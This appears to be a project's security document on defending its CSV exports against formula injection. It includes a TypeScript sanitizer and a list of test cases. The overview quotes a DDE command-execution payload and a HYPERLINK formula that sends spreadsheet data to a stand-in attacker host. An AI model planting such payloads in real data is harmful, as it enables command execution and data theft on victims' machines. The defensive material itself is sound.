# flumenxConectOS — CSV Export Security & Formula Injection Defense

## Vulnerability Overview: CSV / Formula Injection

CSV Injection (also known as Formula Injection) occurs when untrusted input containing characters that spreadsheet applications (such as Microsoft Excel, Google Sheets, or LibreOffice Calc) interpret as formulas is exported into a spreadsheet file without sanitization.

Spreadsheet applications treat cells beginning with any of the following characters as formulas:
- `=` (Equal sign)
- `+` (Plus sign)
- `-` (Minus sign)
- `@` (At sign)
- `\t` (Tab character)
- `\r` (Carriage return)

If an attacker enters `=cmd|'/C calc'!A0` or `=HYPERLINK("http://attacker.com?leak=" & A1, "Click Here")` into a lead full name or form submission field, opening the exported CSV in Excel can lead to arbitrary command execution or silent exfiltration of spreadsheet data.

---

## Defense Mechanism in flumenxConectOS

flumenxConectOS implements OWASP-compliant formula injection defense in `backend/src/utils/csv.ts`.

### Sanitization Logic
```typescript
export function sanitizeCsvField(value: any): string {
  if (value === null || value === undefined) return '';

  let str = String(value).trim();

  // Defense against CSV / Formula Injection:
  // If the field starts with =, +, -, @, or whitespace control characters, prepend a single quote
  if (/^[=+\-@\t\r]/.test(str)) {
    str = `'${str}`;
  }

  // If the field contains commas, double quotes, or newlines, wrap in quotes and double internal quotes
  if (/[",\n\r]/.test(str) || str.startsWith("'")) {
    str = `"${str.replace(/"/g, '""')}"`;
  }

  return str;
}
```

### Protection Coverage
1. **Every Cell Value**: Leads full names, emails, phone numbers, notes, campaign names, and task titles.
2. **All Column Headers**: Even column headers are passed through `sanitizeCsvField`.
3. **Metadata Section**: Commented header metadata (`# Platform: ...`, `# Exported By: ...`) is also sanitized before writing to the output stream.

### Test Verification
The automated test suite verifies neutralization of payloads:
- Payload `=CMD("calc")` is exported as `"'=CMD(""calc"")"`. When opened in Excel, it renders as literal text `'=CMD("calc")` and is never executed as a formula.
- Payload `@malicious@test.com` is exported as `"'@malicious@test.com"`.
- Payload `+15551234567` is exported as ` "'+15551234567"`.
- Payload `-negative_formula` is exported as ` "'-negative_formula"`.

---

## Additional Export Safeguards

1. **Volume Ceiling**: Exports are strictly bounded to a maximum of 5,000 records per export request, preventing Denial of Service (DoS) and memory exhaustion on large workspaces.
2. **Access Control**: CSV exports strictly require the `reports.export` permission.
3. **Financial Column Gating**: Financial metrics (spend, CPC, CPL) are stripped if the user lacks `reports.view_financial`.
